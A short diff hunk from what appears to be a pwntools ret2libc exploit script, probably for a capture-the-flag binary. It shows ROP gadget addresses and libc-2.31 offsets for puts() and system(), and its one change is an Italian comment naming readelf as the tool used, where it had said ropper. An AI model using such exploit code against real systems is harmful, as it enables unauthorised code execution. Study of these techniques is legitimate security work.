@@ -18,7 +18,7 @@ def main():
     pop_rdi_gadget = p64(0x401203)
     ret_gadget = p64(0x40101a)
 
-    #I seguenti indirizzi sono stati ottenuti tramite ropper sul libc (in questo caso libc-2.31.so)
+    #I seguenti indirizzi sono stati ottenuti tramite readelf sul libc (in questo caso libc-2.31.so)
     puts_libc_addr = 0x84420 #offset dell'indirizzo della funzione puts() in libc
     system_libc_addr = 0x52290 #offset dell'indirizzo della funzione system() in libc
 
